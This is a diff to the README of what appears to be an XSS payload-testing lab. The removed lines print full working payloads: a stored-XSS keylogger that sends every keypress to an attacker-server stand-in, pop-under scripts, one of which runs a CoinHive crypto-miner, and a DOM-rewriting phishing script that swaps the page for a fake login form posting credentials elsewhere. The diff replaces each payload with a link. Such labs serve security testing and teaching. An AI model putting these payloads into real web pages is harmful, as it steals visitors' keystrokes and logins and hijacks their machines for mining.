@@ -62,24 +62,7 @@ You can use it to check for session attacks.
 
 #### Simple Keylogger / Stored XSS
 
-Store in the list:
-
-```
-<script>
-function httpGet(theUrl)
-{
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
-    xmlHttp.send( null );
-    return xmlHttp.responseText;
-}
-document.onkeypress = zx;
-function zx(e){
-	var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
-	httpGet("http://localhost/c?"+charCode);
-}
-</script>
-```
+Store in the list: [payload_code](https://github.com/secf00tprint/payloadtester_xss/blob/master/payloads/keylogger.js)
 
 If you now goto the list and enter keys they will be send to attacker_server.
 
@@ -95,46 +78,7 @@ Following payload works on the listed browsers if you allow popups for the side:
 - Firefox 59.0.2
 - Safari 11.0.3
 
-```
-<script>
-var popunder;
-var _parent;
-function jsPopunder(sUrl) {
-
-sName = "s";
-var sOptions = 'toolbar=no,scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=no,width=100,height=100,screenX=2048,screenY=2048,left=2048,top=2048';
-
-// create pop-up from parent context
-_parent = (top != self && typeof(top.document.location.toString())==='string') ? top : self;
-_parent.name = "parent";
-var popunder = _parent.window.open(sUrl, sName, sOptions);
-if (popunder) {
-popunder.blur();
-if (navigator.userAgent.indexOf('MSIE') === -1) {
-popunder.params = { url: sUrl };
-(function(e) {
-if (typeof window.mozPaintCount != 'undefined' || typeof navigator.webkitGetUserMedia === "function") {
-try {
-var poltergeist = document.createElement('a');
-poltergeist.href = "javascript:window.open('about:blank').close();document.body.removeChild(poltergeist)";
-document.body.appendChild(poltergeist).click();
-}catch(err){}
-}
-})(popunder);
-}
-window.focus();
-try{ opener.window.focus(); }catch(err){}
-}
-}
-jsPopunder("http://localhost:8000/test.html");
-setTimeout(function(){
-	window.focus();
-	if (_parent) {_parent.window.focus();} 
-	goBack = window.open('','parent');
-	if (goBack) {goBack.focus();}
-}, 100);
-</script>
-```
+[payload_code](https://github.com/secf00tprint/payloadtester_xss/blob/master/payloads/popunder.js)
 
 #### Crypto-Miner
 
@@ -163,46 +107,7 @@ On CoinHive check if pending payments are coming in:
 
 To run miner in pop-under use the following snippet. Change key in attacker server [html file](./docker/attacker_server/serverfiles/coins/miner.html) to your public key: 
 
-```
-<script>
-var popunder;
-var _parent;
-function jsPopunder(sUrl) {
-
-sName = "s";
-var sOptions = 'toolbar=no,scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=no,width=100,height=100,screenX=2048,screenY=2048,left=2048,top=2048';
-
-// create pop-up from parent context
-_parent = (top != self && typeof(top.document.location.toString())==='string') ? top : self;
-_parent.name = "parent";
-var popunder = _parent.window.open(sUrl, sName, sOptions);
-if (popunder) {
-popunder.blur();
-if (navigator.userAgent.indexOf('MSIE') === -1) {
-popunder.params = { url: sUrl };
-(function(e) {
-if (typeof window.mozPaintCount != 'undefined' || typeof navigator.webkitGetUserMedia === "function") {
-try {
-var poltergeist = document.createElement('a');
-poltergeist.href = "javascript:window.open('about:blank').close();document.body.removeChild(poltergeist)";
-document.body.appendChild(poltergeist).click();
-}catch(err){}
-}
-})(popunder);
-}
-window.focus();
-try{ opener.window.focus(); }catch(err){}
-}
-}
-jsPopunder("http://localhost/coins/miner.html");
-setTimeout(function(){
-	window.focus();
-	if (_parent) {_parent.window.focus();} 
-	goBack = window.open('','parent');
-	if (goBack) {goBack.focus();}
-}, 100);
-</script> 
-```
+[payload_code](https://github.com/secf00tprint/payloadtester_xss/blob/master/payloads/popunder_cryptominer.js)
 
 ### Run JavaScript from Attacker-Server
 
@@ -303,80 +208,7 @@ Next section see the first attack:
 
 Payload:
 
-```
-<script>
-function removeTree(nodeIterator){
-while (nodeIterator.firstChild) {nodeIterator.removeChild(nodeIterator.firstChild);}
-}
-removeTree(document.body);
-
-var header = document.createElement("header");
-
-var para1 = document.createElement("p");
-para1.setAttribute("style","text-align:center;");
-
-var img = document.createElement("img");
-img.setAttribute("src","logo.png")
-img.setAttribute("alt","Logo");
-
-var form = document.createElement("form");
-form.setAttribute("action","http://localhost/loginpage/login.php");
-form.setAttribute("method","POST");
-form.setAttribute("id","findme");
-
-var para2 = document.createElement("p");
-var para2text = document.createTextNode("Enter Login data");
-
-var div1 = document.createElement("div");
-
-var label1 = document.createElement("label");
-label1.setAttribute("for","user");
-var label1text = document.createTextNode("Username:");
-
-var input1 = document.createElement("input");
-input1.setAttribute("name","user");
-
-var div2 = document.createElement("div");
-
-var label2 = document.createElement("label");
-label2.setAttribute("for","user");
-var label2text = document.createTextNode("Password:");
-
-var input2 = document.createElement("input");
-input2.setAttribute("name","pass");
-input2.setAttribute("type","password");
-
-var br = document.createElement("br");
-
-var button = document.createElement("button");var body = document.body;
-button.setAttribute("type","submit");
-var buttontext = document.createTextNode("Login");
-
-body.appendChild(header);
-header.appendChild(para1);
-header.appendChild(img);
-body.appendChild(form);
-form.appendChild(para2);
-para2.appendChild(para2text);
-form.appendChild(div1);
-div1.appendChild(label1);
-label1.appendChild(label1text);
-div1.appendChild(input1);
-form.appendChild(br);
-form.appendChild(div2);
-div2.appendChild(label2);
-label2.appendChild(label2text);
-div2.appendChild(input2);
-form.appendChild(br);
-form.appendChild(button);
-button.appendChild(buttontext);
-
-window.onload = function () {
-	var nodeIt = document.getElementById("findme");
-	while (nodeIt.nextSibling){nodeIt = nodeIt.nextSibling;removeTree(nodeIt);
-	}}
-</script>
-```
+[payload_code](https://github.com/secf00tprint/payloadtester_xss/blob/master/payloads/phishing_dommanipulation.js)
 
 #### Redirect to Victim Server 
 
